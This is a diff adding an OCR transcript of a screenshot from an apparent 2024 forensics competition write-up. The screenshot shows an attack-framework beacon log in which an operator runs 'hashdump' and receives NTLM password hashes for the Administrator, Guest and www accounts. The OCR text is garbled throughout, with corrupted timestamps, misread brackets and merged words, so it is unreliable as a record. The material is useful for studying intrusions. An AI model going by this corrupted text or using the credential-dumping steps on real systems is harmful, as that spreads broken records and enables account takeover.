@@ -1,0 +1,12 @@
+# OCR: 60d49fc89e9fa1015fd1bfa27430f6c9.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/60d49fc89e9fa1015fd1bfa27430f6c9.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:15
+
+e5/227-42:34UTc[checkinlhostcalledhome,sent:12bytes e5/2207-43-07UTC
+[inputl<neo>hashdump
+05/2207-43-08UTc[taskl<T1003,T1055,T1093>Taskedbeacontodunphashes 05/227-43-08UTc[checkinlhostcalledhome.sent:82541bytes
+5/22e7-43:09UTc[output] receivedpasswordhashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::= www:1000-aad3b435b51404eeaad3b435b51404ee-31d6cfe0d16ae931b73c59d7e0c089c0::
